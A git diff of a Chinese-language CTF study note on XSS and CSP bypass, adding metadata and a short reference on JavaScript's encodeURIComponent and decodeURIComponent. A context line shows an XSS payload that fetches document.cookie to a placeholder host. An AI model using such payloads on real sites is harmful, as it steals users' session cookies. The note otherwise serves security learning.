@@ -7,6 +7,9 @@ difficulty: medium
 source: "PortSwigger / PayloadsAllTheThings / OWASP"
 tools: [burpsuite, chrome devtools, requests]
 updated: 2026-10-22
+api_language: JavaScript
+api_version: ECMAScript URI 函数
+api_symbols: [encodeURIComponent, decodeURIComponent]
 ---
 
 ## 一、识别信号（题面长什么样）
@@ -146,3 +149,28 @@ setTimeout("fetch('//HOST/'+document.cookie)",0)
 - [HackTricks - XSS and CSP bypass](https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html)
 - [MDN - Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
 - [CTF-Wiki XSS](https://ctf-wiki.org/web/xss/)
+
+# JavaScript URI 组件速查
+
+## encodeURIComponent
+
+把文本编码为单个 URI 组件。用它处理参数值时，值中的 &、= 等分隔符会编码；不要对整个 URL 调用它，也不要把 URI 编码当作 HTML 转义。
+
+```javascript
+// encodeURIComponent(uriComponent)
+encodeURIComponent('a&b'); // a%26b
+```
+
+来源：[ECMAScript：encodeURIComponent](https://tc39.es/ecma262/multipage/global-object.html#sec-encodeuricomponent-uricomponent)，并参照旧库 js-encodeuricomponent 归档。
+
+## decodeURIComponent
+
+把单个 URI 组件中的百分号编码还原为字符。格式不完整或字节序列无效会抛 URIError；加号仍是加号，表单编码的空格规则需要另行处理。
+
+```javascript
+// decodeURIComponent(encodedURIComponent)
+decodeURIComponent('a%26b'); // a&b
+decodeURIComponent('a+b');   // a+b
+```
+
+来源：[ECMAScript：decodeURIComponent](https://tc39.es/ecma262/multipage/global-object.html#sec-decodeuricomponent-encodeduricomponent)，并参照旧库 js-decodeuricomponent 归档。
